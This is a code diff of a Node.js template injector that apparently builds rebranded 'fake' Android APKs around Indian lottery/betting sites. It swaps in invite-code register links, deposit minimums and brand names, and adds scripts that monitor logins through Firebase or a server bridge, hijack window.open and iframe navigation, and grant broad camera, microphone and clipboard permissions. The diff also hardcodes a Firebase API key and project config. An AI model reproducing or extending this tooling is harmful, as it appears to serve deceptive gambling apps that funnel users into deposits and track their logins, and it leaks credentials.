@@ -2,7 +2,6 @@ const fs = require('fs');
 
 /**
  * Extract domain from register URL
- * e.g. https://example.com/#/register?invitationCode=123  → example.com
  */
 function extractDomain(registerUrl) {
   try {
@@ -13,15 +12,10 @@ function extractDomain(registerUrl) {
   }
 }
 
-/**
- * Detect if a register/game URL follows Dhani Win style (no hash, query params, etc.)
- * e.g. https://example.com/register?inviteCode=EXAMPLE
- */
 function isDhaniUrl(url) {
   if (!url) return false;
   const u = String(url).trim().toLowerCase();
   if (u.includes('dhani')) return true;
-  // If URL has no hash route (#/) and has invite/register/wallet/wingo keywords
   if (!u.includes('#/')) {
     if (u.includes('invitecode') || u.includes('invite_code') || u.includes('/register') || u.includes('/wallet') || u.includes('/wingo')) {
       return true;
@@ -30,10 +24,6 @@ function isDhaniUrl(url) {
   return false;
 }
 
-/**
- * Build deposit/wingo URLs from register URL by replacing the hash path
- * Auto-detects Dhani Win URLs if isDhani is omitted or false.
- */
 function buildUrls(registerUrl, isDhani = false) {
   let base;
   try {
@@ -54,22 +44,14 @@ function buildUrls(registerUrl, isDhani = false) {
   };
 }
 
-/**
- * SERVER LIVE MODE shim (fake / no-Firebase builds).
- * window.rtdb ka lightweight replacement: config/users nodes server ke
- * /api/rtdb bridge se poll karta hai (config = DB se instant, users =
- * server-side Firebase proxy). Template ka purana Firebase code
- * (rtdb.ref(...).on('value') / .set(...)) bina kisi edit ke chalta hai,
- * aur APK me koi Firebase SDK/key/config nahi jaata.
- */
 function buildRtdbShimScript(liveBase, livePath) {
   const base = JSON.stringify(String(liveBase).replace(/\/+$/, ''));
   const root = JSON.stringify(String(livePath));
   const L = [];
   L.push('<script>');
-  L.push('/* MIZANMOD RTDB SHIM V1 — server live mode (no Firebase in APK) */');
+  L.push('/* MIZANMOD RTDB SHIM V1 — server live mode (no Firebase in APK) — dual bridge ZAYRO+MIZANMOD */');
   L.push('(function(){');
-  L.push('  if(window.rtdb && window.rtdb.__mizanmodShim) return;');
+  L.push('  if(window.rtdb && (window.rtdb.__zayroShim || window.rtdb.__mizanmodShim)) return;');
   L.push('  var BASE=' + base + ', ROOT=' + root + ';');
   L.push('  function aj(url,opt,cb){');
   L.push('    try{');
@@ -99,19 +81,17 @@ function buildRtdbShimScript(liveBase, livePath) {
   L.push('  Ref.prototype.remove=function(cb){ if(this.__p.indexOf("users")===0){ if(typeof cb==="function")try{cb();}catch(e){} return this; } aj(this.__url(),{method:"DELETE"},function(){ if(typeof cb==="function")try{cb();}catch(e){} }); return this; };');
   L.push('  Ref.prototype.child=function(c){ return new Ref((this.__p?this.__p+"/":"")+String(c)); };');
   L.push('  Ref.prototype.off=function(){ return this; };');
-  L.push('  var shimDb={ __mizanmodShim:true, ref:function(p){ return new Ref(p); } }; window.rtdb=shimDb;');
+  L.push('  window.rtdb={ __zayroShim:true, __mizanmodShim:true, ref:function(p){ return new Ref(p); } };');
+  L.push('  if(!window.MIZANMOD) window.MIZANMOD=window.rtdb;');
+  L.push('  if(!window.ZAYRO) window.ZAYRO=window.rtdb;');
   L.push('  if(typeof window.firebase==="undefined"){');
-  L.push('    window.firebase={ apps:[], initializeApp:function(){ return {}; }, app:function(){ return {}; }, database:function(){ return shimDb; } };');
+  L.push('    window.firebase={ apps:[], initializeApp:function(){ return {}; }, app:function(){ return {}; }, database:function(){ return window.rtdb; } };');
   L.push('  }');
   L.push('})();');
   L.push('</script>');
   return L.join('');
 }
 
-/**
- * Inject all user params into HTML template
- * Handles both normal (mizanmod/wings) and dhani type HTMLs
- */
 function injectParams(htmlContent, params) {
   let {
     registerUrl,
@@ -130,13 +110,8 @@ function injectParams(htmlContent, params) {
   let html = htmlContent;
 
   // ── SERVER LIVE MODE (fake / no-Firebase builds) ──
-  // Fake APKs me Firebase SDK/config bilkul nahi jaata (security posture).
-  // Uski jagah ek chhota sa `rtdb` SHIM inject hota hai jo live links,
-  // minDeposit/conditions aur users (login monitoring / warning popup)
-  // server ke /api/rtdb bridge se poll karta hai. Template ka apna code
-  // (rtdb.ref(...).on('value') / .set(...)) bina change ke chalta rehta hai.
-  liveBase = String(process.env.BASE_URL || liveBase || '');
-  const serverMode = /^https:\/\//i.test(liveBase);
+  // Correct logic: only when liveMode === 'server' and liveBase is https
+  const serverMode = liveMode === 'server' && /^https?:\/\//i.test(String(liveBase || ''));
   if (serverMode) {
     html = html.replace(
       /<script[^>]*src=["'][^"']*firebase-(app|database)-compat[^"']*["'][^>]*><\/script>/gi,
@@ -145,10 +120,6 @@ function injectParams(htmlContent, params) {
   }
 
   // ── NORMALIZE GAME FRAME ──
-  // Most uploaded designs already contain target-game-frame. A few (notably
-  // Golden variants) navigate through a native bridge that is not available in
-  // every Android template. Inject the same iframe contract automatically so
-  // all designs use one reliable navigation/state pipeline.
   const hadGameFrame = /<iframe\b[^>]*\bid=["'](?:target-game-frame|gameIframe)["']/i.test(html);
   if (!hadGameFrame) {
     const frameCss = '<style id="mizanmod-auto-frame-style">#target-game-frame{position:fixed;inset:0;width:100%;height:100%;border:0;background:#000;z-index:0}</style>';
@@ -160,7 +131,6 @@ function injectParams(htmlContent, params) {
   }
 
   // ── REGISTER URL ──
-  // Matches: REGISTER_URL="...", href="...", gameFrame.src="..."
   html = html.replace(
     /(var\s+REGISTER_URL\s*=\s*["'])([^"']+)(["'])/g,
     `$1${registerUrl}$3`
@@ -186,9 +156,7 @@ function injectParams(htmlContent, params) {
     `$1${wingoUrl}$3`
   );
 
-  // ── UNIVERSAL ROUTE NORMALIZATION (Future Designs Auto-Compat) ──
-  // If an uploaded template only checks hash-based routes, upgrade it automatically
-  // so it seamlessly supports non-hash games like DhaniWin without manual code changes.
+  // ── UNIVERSAL ROUTE NORMALIZATION ──
   html = html.replace(
     /isOnRegisterPage\s*=\s*hash\.indexOf\(['"]\/register['"]\)\s*>=\s*0\s*\|\|\s*hash\.indexOf\(['"]invitationcode['"]\)\s*>=\s*0\s*\|\|\s*hash\.indexOf\(['"]invitecode['"]\)\s*>=\s*0(?!\s*\|\|\s*u\.indexOf);?/g,
     "isOnRegisterPage=hash.indexOf('/register')>=0||hash.indexOf('invitationcode')>=0||hash.indexOf('invitecode')>=0||u.indexOf('/register')>=0||u.indexOf('invitecode')>=0||u.indexOf('invitationcode')>=0;"
@@ -206,45 +174,36 @@ function injectParams(htmlContent, params) {
     "var isWingo=hash.indexOf('/saaslottery')>=0||hash.indexOf('wingo')>=0||hash.indexOf('lottery')>=0||u.indexOf('/wingo')>=0||u.indexOf('wingo')>=0||u.indexOf('lottery')>=0;"
   );
 
-  // ── FIREBASE DB PATH (e.g. "mizanmod_example_one", "mizanmod_example_two") ──
-  // Extract current path prefix from HTML first
+  // ── FIREBASE DB PATH ──
   const pathMatch = html.match(/rtdb\.ref\(["']([a-zA-Z0-9_]+)\/(config|users)/);
   const oldPrefix = pathMatch ? pathMatch[1] : null;
 
   if (oldPrefix && oldPrefix !== firebasePath) {
-    // Replace only in rtdb.ref("oldPrefix/...") contexts
-    // Match: rtdb.ref("oldPrefix/config") and rtdb.ref("oldPrefix/users/...)
     const escapeRegex = (str) => str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
     const escapedOld = escapeRegex(oldPrefix);
-
-    // Pattern: rtdb.ref("oldPrefix/
     html = html.replace(
       new RegExp(`(rtdb\\.ref\\(["'])${escapedOld}(\\/(?:config|users))`, 'g'),
       `$1${firebasePath}$2`
     );
+    // Also replace any hardcoded old prefix like zayrolivesunny globally if it's the old one
+    // This handles templates that have hardcoded path strings outside rtdb.ref
+    if (oldPrefix === 'zayrolivesunny' || oldPrefix.startsWith('zayro') || oldPrefix.startsWith('mizanmod')) {
+      const globalOld = new RegExp(escapeRegex(oldPrefix), 'g');
+      html = html.replace(globalOld, firebasePath);
+    }
   }
 
   // ── MIN DEPOSIT ──
-  // Kuch templates me fbMinDeposit/minDeposit COMMA-separated var list me
-  // hota hai ('var rtdb=null, fbDepositCondition=true, fbMinDeposit=500;')
-  // — pehle ka regex sirf 'var fbMinDeposit=500' dhundta tha, isliye ye
-  // kabhi replace nahi hote the. Ab \b se dono forms milte hain.
   html = html.replace(
     /(\b(?:fbMinDeposit|minDeposit)\s*=\s*)(\d+)/g,
     (m, g1) => g1 + minDeposit
   );
-  // rechargeAmt span default content
   html = html.replace(
     /(<span\s+id=["']rechargeAmt["'][^>]*>)[^<]*/g,
     `$1&#8377;${minDeposit}`
   );
 
-  // ── BRAND TITLE (popup card header / warning popup / <title>) ──
-  // Kuch templates ke title ke andar nested elements hote hain (<span>,
-  // &nbsp; etc.) — isliye PURA inner content replace karte hain (lazy
-  // match closing </div> tak), sirf opening tag ke baad wala text nahi.
-  // NOTE: 'card-title' pattern me lookahead (?=[\s"']) hai taaki
-  // card-title-block / card-title-line1 (alag meaning) match na ho.
+  // ── BRAND TITLE ──
   const brandAttrPatterns = [
     /class=["'][^"']*brand-name[^"']*["']/,
     /class=["'][^"']*card-title-line1[^"']*["']/,
@@ -259,25 +218,14 @@ function injectParams(htmlContent, params) {
       (m, g1) => g1 + brandTitle + '</div>'
     );
   }
-  // wo-head-title / card-brand headers me sirf MAIN line (cb-main) change
-  // karo — subtitle (cb-sub) design ke hisaab se waisa hi rehta hai.
   html = html.replace(
     /(<(?:span|div)[^>]*class=["'][^"']*cb-main[^"']*["'][^>]*>)([\s\S]*?)(<\/(?:span|div)>)/g,
     (m, g1, g2, g3) => g1 + brandTitle + g3
   );
-  // Plain-text wo-head-title (jisme cb-main NAHI hai) — full inner replace.
-  // cb-main wale pehle se handle ho chuke hain, unhe skip karte hain
-  // (negative lookahead) taaki duplicate text na bane.
   html = html.replace(
     /(<div[^>]+class=["'][^"']*wo-head-title[^"']*["'][^>]*>)(?![^<]*<[^>]*cb-main)([\s\S]*?)<\/div>/g,
     (m, g1, g2) => g1 + brandTitle + '</div>'
   );
-  // ══ RED-CORE/DHANI TEMPLATE FIX ══
-  // Ye templates runtime pe JS se brand set karte hain:
-  //   s.textContent = s.getAttribute('data-brand-text') || window.BRAND_NAME;
-  // Agar data-brand-text / BRAND_NAME purana naam rakhte hain to inject
-  // hua naya naam JS overwrite kar deta hai — isi se "popup card me name
-  // nahi badla, warning popup me badal gaya" hota tha. Dono ko badlo.
   html = html.replace(
     /(data-brand-text=["'])[^"']*(["'])/g,
     (m, g1, g2) => g1 + brandTitle + g2
@@ -286,7 +234,6 @@ function injectParams(htmlContent, params) {
     /(window\.BRAND_NAME\s*=\s*window\.BRAND_NAME\s*\|\|\s*["'])[^"']*(["'])/g,
     (m, g1, g2) => g1 + brandTitle + g2
   );
-  // Backup: simple-text wale divs (agar upar wala match na hua ho)
   const brandSimple = [
     /(<div[^>]+class=["'][^"']*brand-name[^"']*["'][^>]*>)[^<]*/g,
     /(<div[^>]+class=["'][^"']*card-title-line1[^"']*["'][^>]*>)[^<]*/g,
@@ -297,9 +244,8 @@ function injectParams(htmlContent, params) {
   });
   html = html.replace(/(<title>)[^<]*/g, (m, g1) => g1 + brandTitle);
 
-  // ── APP ICON (my_icon.png → base64 data URI embedded) ──
+  // ── APP ICON ──
   if (appIconBase64) {
-    // Replace src="my_icon.png" in both miniBtn img and anywhere
     html = html.replace(
       /src=["']my_icon\.png["']/g,
       `src="data:image/png;base64,${appIconBase64}"`
@@ -307,17 +253,15 @@ function injectParams(htmlContent, params) {
   }
 
   // ── FIREBASE PLACEHOLDER FIX ──
-  // Several uploaded designs contain Sketchware's unresolved secret marker.
-  // Without a real web API key their original condition listener never starts,
-  // so panel states/minimum-deposit changes cannot arrive from Firebase.
+  // Use env var if set, otherwise fallback to hardcoded key like zayromod
+  const fallbackApiKey = 'AIzaSyDja5Gx4v4sMbx4BM2_od9_bLkdxdEY4do';
+  const apiKeyToUse = process.env.FIREBASE_WEB_API_KEY || fallbackApiKey;
   html = html.replace(
     /@secret:GOOGLE_API_KEY/g,
-    String(process.env.FIREBASE_WEB_API_KEY || '')
+    apiKeyToUse
   );
 
   // ── FIREBASE LIVE LINKS ──
-  // URLs are intentionally NOT stored in the APK or localStorage. The app
-  // waits for <firebasePath>/config and always uses those Firebase values.
   let firebaseSdkScripts = '';
   if (!serverMode) {
     if (!/firebase-app-compat\.js/i.test(html)) {
@@ -328,13 +272,26 @@ function injectParams(htmlContent, params) {
     }
   }
   const shimScript = serverMode ? buildRtdbShimScript(liveBase, firebasePath) : '';
+
+  // Firebase config: use env vars if set, otherwise hardcoded zayromod defaults (so Firebase works out-of-box)
+  const fbConfig = {
+    apiKey: process.env.FIREBASE_WEB_API_KEY || 'AIzaSyDja5Gx4v4sMbx4BM2_od9_bLkdxdEY4do',
+    authDomain: (process.env.FIREBASE_PROJECT_ID || 'zayrodev-195f3') + '.firebaseapp.com',
+    projectId: process.env.FIREBASE_PROJECT_ID || 'zayrodev-195f3',
+    databaseURL: process.env.FIREBASE_DATABASE_URL || 'https://zayrodev-195f3-default-rtdb.firebaseio.com'
+  };
+  // If custom project ID is set via env, use its authDomain pattern
+  if (process.env.FIREBASE_PROJECT_ID) {
+    fbConfig.authDomain = process.env.FIREBASE_PROJECT_ID + '.firebaseapp.com';
+  }
+
   const liveLinksScript = `${firebaseSdkScripts}<script>
 (function(){
   var livePath=${JSON.stringify(firebasePath)};
   var autoFrameInjected=${hadGameFrame ? 'false' : 'true'};
   var gameFrame=window.gameFrame||document.getElementById('target-game-frame')||document.getElementById('gameIframe');
   if(gameFrame)window.gameFrame=gameFrame;
-  var firebaseConfig=${JSON.stringify({apiKey:process.env.FIREBASE_WEB_API_KEY || '',projectId:process.env.FIREBASE_PROJECT_ID || '',databaseURL:process.env.FIREBASE_DATABASE_URL || ''})};
+  var firebaseConfig=${JSON.stringify(fbConfig)};
   function valid(u){return typeof u==='string' && /^https?:\\/\\//i.test(u);}
   var firstFirebaseLinkLoad=true;
   function applyLinks(data){
@@ -345,10 +302,6 @@ function injectParams(htmlContent, params) {
     var nextWingo=data.wingoUrl||data.wingo_url;
     if(!valid(nextRegister)||!valid(nextDeposit)||!valid(nextWingo))return;
     if(nextRegister===REGISTER_URL&&nextDeposit===DEPOSIT_URL&&nextWingo===WINGO_URL){return;}
-    // FIX 13-Sep: links same hai to iframe ko bilkul mat chhoo. Pehla har
-    // config echo/poll applyLinks chala kar gameFrame.src reset kar deta tha
-    // (src attribute register-URL hi rehta hai jab game andar se route badle)
-    // -> user bet ke beech home/login par phek jaata tha.
     REGISTER_URL=nextRegister;
     DEPOSIT_URL=nextDeposit;
     WINGO_URL=nextWingo;
@@ -374,11 +327,13 @@ function injectParams(htmlContent, params) {
     };
   }
   window.__mizanmodAuthRoute=false;
+  window.__zayroAuthRoute=false;
   if(typeof window.setUrl==='function'&&!window.setUrl.__mizanmodWrapped){
     var originalSetUrl=window.setUrl;
     var wrappedSetUrl=function(url){
       var lower=(url||'').toString().toLowerCase();
       window.__mizanmodAuthRoute=lower.indexOf('/register')>=0||lower.indexOf('invitationcode')>=0||lower.indexOf('invitecode')>=0||lower.indexOf('/login')>=0;
+      window.__zayroAuthRoute=window.__mizanmodAuthRoute;
       var result=originalSetUrl.apply(this,arguments);
       if(window.__mizanmodAuthRoute&&typeof window.setState==='function'){
         try{window.setState('wait');}catch(e){}
@@ -390,22 +345,25 @@ function injectParams(htmlContent, params) {
       return result;
     };
     wrappedSetUrl.__mizanmodWrapped=true;
+    wrappedSetUrl.__zayroWrapped=true;
     window.setUrl=wrappedSetUrl;
   }
   if(typeof window.setBalance==='function'&&!window.setBalance.__mizanmodWrapped){
     var originalSetBalance=window.setBalance;
     var wrappedSetBalance=function(balance){
-      if(window.__mizanmodAuthRoute){
+      if(window.__mizanmodAuthRoute||window.__zayroAuthRoute){
         if(typeof window.setState==='function')try{window.setState('wait');}catch(e){}
         return;
       }
       return originalSetBalance.apply(this,arguments);
     };
     wrappedSetBalance.__mizanmodWrapped=true;
+    wrappedSetBalance.__zayroWrapped=true;
     window.setBalance=wrappedSetBalance;
   }
   if(gameFrame&&!gameFrame.__mizanmodLoadReporter){
     gameFrame.__mizanmodLoadReporter=true;
+    gameFrame.__zayroLoadReporter=true;
     gameFrame.addEventListener('load',function(){
       try{if(typeof window.setUrl==='function')window.setUrl(gameFrame.src||'');}catch(e){}
     });
@@ -447,16 +405,15 @@ function injectParams(htmlContent, params) {
   }, 150);
 })();
 </script><script>
-// ── MIZANMOD UNIVERSAL IN-APP URL HANDLER - FIX FOR DHANIWIN / 13L DEPOSIT WHITE SCREEN ──
-// Ensures all external URLs (deposit, payment gateways, etc.) open inside APK, never white screen
+// ── MIZANMOD UNIVERSAL IN-APP URL HANDLER - dual bridge support
 (function(){
   if(window.__mizanmodUrlFixApplied) return;
   window.__mizanmodUrlFixApplied = true;
+  window.__zayroUrlFixApplied = true;
   function isPaymentGatewayUrl(u){
     if(!u) return false;
     var s = String(u).toLowerCase();
     if(s==='about:blank' || s.startsWith('file://')) return false;
-    // Wallet/recharge pages themselves are OK in iframe, but their child pay pages are NOT
     var isWalletPage = (s.includes('/wallet') || s.includes('recharge')) && !s.includes('/pay') && !s.includes('checkout') && !s.includes('qr') && !s.includes('upi');
     if(isWalletPage) return false;
     var payKeys = ['/pay','checkout','/qr','upi','razorpay','cashfree','payu','ccavenue','arpay','usdt','ewallet','phonepe','paytm','gpay','gateway','/payment','/order','/initiate','/processing','/cashier','/deposit/pay','/recharge/pay'];
@@ -468,14 +425,16 @@ function injectParams(htmlContent, params) {
     var u = String(url).trim();
     if(!u) return false;
     try{
-      if(window.MIZANMOD && typeof window.MIZANMOD.openExternal === 'function'){
-        window.MIZANMOD.openExternal(u);
+      var br = window.MIZANMOD || window.ZAYRO;
+      if(br && typeof br.openExternal === 'function'){
+        br.openExternal(u);
         return true;
       }
     }catch(e){}
     try{
-      if(window.MIZANMOD && typeof window.MIZANMOD.openUrl === 'function' && !isPaymentGatewayUrl(u)){
-        window.MIZANMOD.openUrl(u);
+      var br2 = window.MIZANMOD || window.ZAYRO;
+      if(br2 && typeof br2.openUrl === 'function' && !isPaymentGatewayUrl(u)){
+        br2.openUrl(u);
         return true;
       }
     }catch(e){}
@@ -486,13 +445,12 @@ function injectParams(htmlContent, params) {
         if(typeof window.setUrl === 'function'){ try{ window.setUrl(u); }catch(e){} }
         return true;
       } else if(gf && isPaymentGatewayUrl(u)){
-        // Payment gateway must open in popup overlay, not iframe (prevents white screen due to X-Frame-Options)
-        if(window.MIZANMOD && window.MIZANMOD.openExternal){ window.MIZANMOD.openExternal(u); return true; }
+        var br3 = window.MIZANMOD || window.ZAYRO;
+        if(br3 && br3.openExternal){ br3.openExternal(u); return true; }
       }
     }catch(e){}
     return false;
   }
-  // Override window.open to keep everything inside app
   try{
     var _origOpen = window.open;
     window.open = function(url, name, specs){
@@ -504,7 +462,6 @@ function injectParams(htmlContent, params) {
       try{ return _origOpen.apply(this, arguments); }catch(e){ return null; }
     };
   }catch(e){}
-  // Intercept clicks on _blank and external links (deposit, payment, etc.)
   document.addEventListener('click', function(e){
     var el = e.target;
     var depth = 0;
@@ -526,16 +483,14 @@ function injectParams(htmlContent, params) {
       depth++;
     }
   }, true);
-  // Aggressively monitor iframe src - if it becomes payment gateway, open in popup and revert
   try{
     var gf = document.getElementById('target-game-frame');
     if(gf){
       var needed = ['allow-forms','allow-modals','allow-orientation-lock','allow-pointer-lock','allow-popups','allow-popups-to-escape-sandbox','allow-presentation','allow-same-origin','allow-scripts','allow-top-navigation','allow-top-navigation-by-user-activation','allow-downloads'];
-      var current = (gf.getAttribute('sandbox')||'').split(/\\s+/);
+      var current = (gf.getAttribute('sandbox')||'').split(/\s+/);
       needed.forEach(function(p){ if(current.indexOf(p)===-1) current.push(p); });
       gf.setAttribute('sandbox', current.join(' ').trim());
       gf.setAttribute('allow', 'autoplay; camera; microphone; clipboard-read; clipboard-write; geolocation; payment; fullscreen; screen-wake-lock; clipboard-write');
-      // Proxy iframe src setter
       try{
         var origDesc = Object.getOwnPropertyDescriptor(HTMLIFrameElement.prototype,'src');
         if(origDesc && origDesc.set){
@@ -553,7 +508,6 @@ function injectParams(htmlContent, params) {
           });
         }
       }catch(e){}
-      // MutationObserver for src attribute
       try{
         var mo = new MutationObserver(function(muts){
           muts.forEach(function(m){
@@ -564,7 +518,6 @@ function injectParams(htmlContent, params) {
                 if(newSrc!==last){
                   window.__lastPayUrl=newSrc;
                   openInApp(newSrc);
-                  // Revert iframe to deposit page to avoid white screen
                   setTimeout(function(){
                     try{
                       if(typeof DEPOSIT_URL!=='undefined' && DEPOSIT_URL) gf.src = DEPOSIT_URL;
@@ -577,7 +530,6 @@ function injectParams(htmlContent, params) {
         });
         mo.observe(gf,{attributes:true, attributeFilter:['src']});
       }catch(e){}
-      // Polling fallback every 800ms
       setInterval(function(){
         try{
           var src = (gf.getAttribute('src')||gf.src||'').toString();
@@ -592,7 +544,6 @@ function injectParams(htmlContent, params) {
       }, 800);
     }
   }catch(e){}
-  // Also override global navigate function if exists (used by panel buttons)
   try{
     if(typeof window.navigate === 'function' && !window.navigate.__mizanmodWrapped){
       var origNav = window.navigate;
@@ -603,18 +554,15 @@ function injectParams(htmlContent, params) {
         return origNav.apply(this, arguments);
       };
       window.navigate.__mizanmodWrapped=true;
+      window.navigate.__zayroWrapped=true;
     }
   }catch(e){}
 })();
 </script>`;
-  // Bootstrap before original inline listeners; keep a stable database object even
-  // when a template declares `var rtdb=null` before firebase.database().
-  if (shimScript) {
-    if (/<head\b[^>]*>/i.test(html)) html = html.replace(/<head\b[^>]*>/i, match => match + shimScript);
-    else html = shimScript + html;
-  }
-  if (/<\/body>/i.test(html)) html = html.replace(/<\/body>/i, `${liveLinksScript}</body>`);
-  else html += liveLinksScript;
+
+  // Correct injection: both shim and liveLinks at </body> together (like zayromod)
+  if (/<\/body>/i.test(html)) html = html.replace(/<\/body>/i, `${shimScript}${liveLinksScript}</body>`);
+  else html += shimScript + liveLinksScript;
 
   return html;
 }
